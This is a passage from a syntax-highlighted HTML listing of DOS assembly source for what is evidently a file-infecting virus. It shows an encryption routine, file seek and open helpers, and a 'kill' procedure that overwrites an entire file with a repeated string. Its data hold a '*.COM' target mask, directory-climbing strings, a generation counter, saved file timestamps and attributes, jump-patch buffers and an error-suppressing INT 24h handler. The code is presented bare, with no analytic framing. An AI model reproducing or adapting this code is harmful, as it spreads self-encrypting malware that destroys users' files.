              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">enc_enc</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">seektof</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seektof</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">seekeof</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                  
              </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">

              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seekeof</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">openfile</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    
              </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                         

              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">openfile</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">kill</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">openfile</span><span class="sc0">                    
              </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">return</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       

              </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">                           

              </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">seekeof</span><span class="sc0">                      

              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stringsize</span><span class="sc0">             
              </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                           
              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    
              </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          
              </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                           

              </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">seektof</span><span class="sc0">                     
              </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc5">loop_</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                           
              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                      
              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stringsize</span><span class="sc0">               
              </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idbuffer</span><span class="sc4">]</span><span class="sc0">  
              </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">ender</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">ender</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">loop_</span><span class="sc0">
</span><span class="sc5">ender</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                     
              </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                       

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kill</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">filespec</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  
</span><span class="sc5">dwildcards</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  
</span><span class="sc5">rootdir</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     
</span><span class="sc5">generation</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000</span><span class="sc0">                       
</span><span class="sc5">origdate</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                         
</span><span class="sc5">origtime</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          
</span><span class="sc5">origattr</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          
</span><span class="sc5">handle</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          
</span><span class="sc5">defaultdrive</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          
</span><span class="sc5">oldjmp</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">       
</span><span class="sc5">thisjmp</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  
</span><span class="sc5">newjmp</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  
</span><span class="sc5">mutantcode</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000</span><span class="sc0">                       
</span><span class="sc5">donebefore</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00</span><span class="sc0">                         
</span><span class="sc5">oint24</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00</span><span class="sc0">                         

</span><span class="sc5">bodyend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; not encrypted</span><span class="sc0">

</span><span class="sc5">newint24</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                     
              </span><span class="sc6">iret</span><span class="sc0">                               
</span><span class="sc5">endcode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">
              </span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">headstart</span><span class="sc0">


</span></div></body>
</html>
